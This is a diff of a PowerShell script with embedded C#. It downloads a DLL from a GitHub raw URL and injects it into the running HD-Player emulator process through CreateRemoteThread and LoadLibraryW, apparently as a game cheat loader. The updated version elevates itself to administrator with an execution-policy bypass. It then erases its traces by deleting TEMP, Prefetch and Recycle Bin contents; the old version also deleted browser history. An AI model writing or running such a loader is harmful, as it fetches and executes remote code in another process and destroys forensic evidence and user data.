@@ -1,141 +1,173 @@
 # ================== CONFIG ===================== #
-$GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/textload-/main/textload.dll" # আপনার GitHub DLL Raw URL
-$processName = "HD-Player.exe"
+$GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/textload-/main/textload.dll"
+$processName = "HD-Player"
+$LocalDLL_Path = "$env:TEMP\textload.dll"  # Better to use TEMP folder than System32
+# =============================================== #
 
-# Process থেকে PID পাওয়া
-$proc = Get-Process -Name ($processName -replace '\.exe$', '') -ErrorAction SilentlyContinue
+# Function to check admin rights
+function Test-Admin {
+    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
 
-if ($proc) {
-    $TargetPID = $proc.Id
-    Write-Host "[*] Found process '$processName' with PID $TargetPID"
-} else {
-    Write-Host "[-] Process '$processName' not found. Exiting script."
+# Check if running as admin
+if (-not (Test-Admin)) {
+    Write-Host "[-] This script requires Administrator privileges. Restarting as admin..."
+    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     exit
 }
 
-# DLL download path (System32)
-$LocalDLL_Path = "C:\Windows\System32\textload.dll"
-# =============================================== #
+# Get process (with improved handling)
+$proc = Get-Process -Name $processName -ErrorAction SilentlyContinue | Select-Object -First 1
 
-Write-Host "[*] Downloading DLL from GitHub..."
-Invoke-WebRequest -Uri $GitHubDLL_URL -OutFile $LocalDLL_Path
+if (-not $proc) {
+    Write-Host "[-] Process '$processName' not found. Make sure it's running."
+    exit
+}
 
-Write-Host "[*] Preparing injector..."
+$TargetPID = $proc.Id
+Write-Host "[*] Found process '$processName' with PID $TargetPID"
 
+# Download DLL
+try {
+    Write-Host "[*] Downloading DLL from GitHub..."
+    Invoke-WebRequest -Uri $GitHubDLL_URL -OutFile $LocalDLL_Path -ErrorAction Stop
+    Write-Host "[+] DLL downloaded successfully to $LocalDLL_Path"
+}
+catch {
+    Write-Host "[-] Failed to download DLL: $_"
+    exit
+}
+
+# Improved injector code
 $injectorCode = @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.ComponentModel;
 
 public class Injector {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int processId);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
+    const int PROCESS_CREATE_THREAD = 0x0002;
+    const int PROCESS_QUERY_INFORMATION = 0x0400;
+    const int PROCESS_VM_OPERATION = 0x0008;
+    const int PROCESS_VM_WRITE = 0x0020;
+    const int PROCESS_VM_READ = 0x0010;
+    
+    const uint MEM_COMMIT = 0x00001000;
+    const uint MEM_RESERVE = 0x00002000;
+    const uint PAGE_READWRITE = 4;
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
         uint dwSize, uint flAllocationType, uint flProtect);
-
+    
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
         byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
-
+    
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
         IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
         IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-
+    
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    
     public static void Inject(int pid, string dllPath) {
-        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, pid);
+        
+        if (hProcess == IntPtr.Zero) {
+            throw new Win32Exception(Marshal.GetLastWin32Error());
+        }
+        
+        // Allocate memory in the remote process
         IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2),
-            0x1000 | 0x2000, 0x04);
-
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        
+        if (allocMemAddress == IntPtr.Zero) {
+            throw new Win32Exception(Marshal.GetLastWin32Error());
+        }
+        
+        // Write DLL path to remote process
         byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
         UIntPtr bytesWritten;
-        WriteProcessMemory(hProcess, allocMemAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten);
-
+        if (!WriteProcessMemory(hProcess, allocMemAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten)) {
+            throw new Win32Exception(Marshal.GetLastWin32Error());
+        }
+        
+        // Get address of LoadLibraryW
         IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
         IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
-
-        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
+        
+        // Create remote thread
+        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, 
+            allocMemAddress, 0, IntPtr.Zero);
+        
+        if (hThread == IntPtr.Zero) {
+            throw new Win32Exception(Marshal.GetLastWin32Error());
+        }
+        
+        // Wait for injection to complete
+        WaitForSingleObject(hThread, 5000);
     }
 }
 "@
 
-Add-Type -TypeDefinition $injectorCode -Language CSharp
-
-Write-Host "[*] Injecting DLL into PID $TargetPID ..."
-[Injector]::Inject($TargetPID, $LocalDLL_Path)
-
-Write-Host "✅ DLL Injected into PID $TargetPID from GitHub"
-
-# ================= Cleaning Section ================= #
-
-Write-Host "[*] Cleaning Temp, Prefetch, Recycle Bin and Download History..."
-
-# Delete the DLL itself from System32
+# Compile injector
 try {
-    Remove-Item -Path $LocalDLL_Path -Force -ErrorAction SilentlyContinue
-    Write-Host "[+] Injected DLL file deleted from System32"
-} catch { Write-Host "[-] DLL delete failed: $_" }
+    Add-Type -TypeDefinition $injectorCode -Language CSharp -ErrorAction Stop
+    Write-Host "[+] Injector code compiled successfully"
+}
+catch {
+    Write-Host "[-] Failed to compile injector: $_"
+    exit
+}
 
-# Clear Temp Folder (all files and folders)
+# Perform injection
 try {
-    Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
-    Write-Host "[+] %TEMP% folder fully cleared"
-} catch { Write-Host "[-] %TEMP% clear failed: $_" }
+    Write-Host "[*] Injecting DLL into process..."
+    [Injector]::Inject($TargetPID, $LocalDLL_Path)
+    Write-Host "✅ DLL injected successfully!"
+}
+catch {
+    Write-Host "[-] Injection failed: $_"
+}
 
-# Clear Windows Prefetch
+# Cleaning section
+Write-Host "[*] Cleaning up..."
 try {
-    Remove-Item -Path "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
-    Write-Host "[+] Prefetch folder cleared"
-} catch { Write-Host "[-] Prefetch clear failed: $_" }
-
-# Empty Recycle Bin
-try {
-    $shell = New-Object -ComObject Shell.Application
-    $recycleBin = $shell.NameSpace(0xA)
-    $items = $recycleBin.Items()
-    $count = $items.Count
-    if ($count -gt 0) {
-        foreach ($item in $items) {
-            Remove-Item $item.Path -Recurse -Force -ErrorAction SilentlyContinue
-        }
-        Write-Host "[+] Recycle Bin emptied"
-    } else {
-        Write-Host "[*] Recycle Bin is already empty"
+    if (Test-Path $LocalDLL_Path) {
+        Remove-Item $LocalDLL_Path -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Temporary DLL removed"
     }
-} catch { Write-Host "[-] Recycle Bin emptying failed: $_" }
-
-# Clear Browser Download History (Chrome, Edge)
-try {
-    $LocalAppData = $env:LOCALAPPDATA
-    $ChromeHistory = "$LocalAppData\Google\Chrome\User Data\Default\History"
-    $EdgeHistory = "$LocalAppData\Microsoft\Edge\User Data\Default\History"
     
-    if (Test-Path $ChromeHistory) {
-        Remove-Item $ChromeHistory -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] Chrome Download History cleared"
-    }
-    if (Test-Path $EdgeHistory) {
-        Remove-Item $EdgeHistory -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] Edge Download History cleared"
-    }
-} catch { Write-Host "[-] Browser history clear failed: $_" }
+    # Clear Temp
+    Get-ChildItem -Path $env:TEMP -Force | Where-Object { $_.Name -ne "" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+    Write-Host "[+] Temp folder cleared"
+    
+    # Clear Prefetch (if possible)
+    try {
+        Get-ChildItem -Path "$env:SYSTEMROOT\Prefetch" -Force -ErrorAction Stop | Remove-Item -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Prefetch cleared"
+    } catch { Write-Host "[*] Couldn't clear Prefetch (may require special permissions)" }
+    
+    # Empty Recycle Bin
+    $recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
+    $recycleBin.Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }
+    Write-Host "[+] Recycle Bin emptied"
+}
+catch {
+    Write-Host "[-] Cleanup error: $_"
+}
 
-Write-Host "✅ Cleaning Complete"
-
-
-
-
-
-
-
-
-
-
+Write-Host "✅ Script completed"
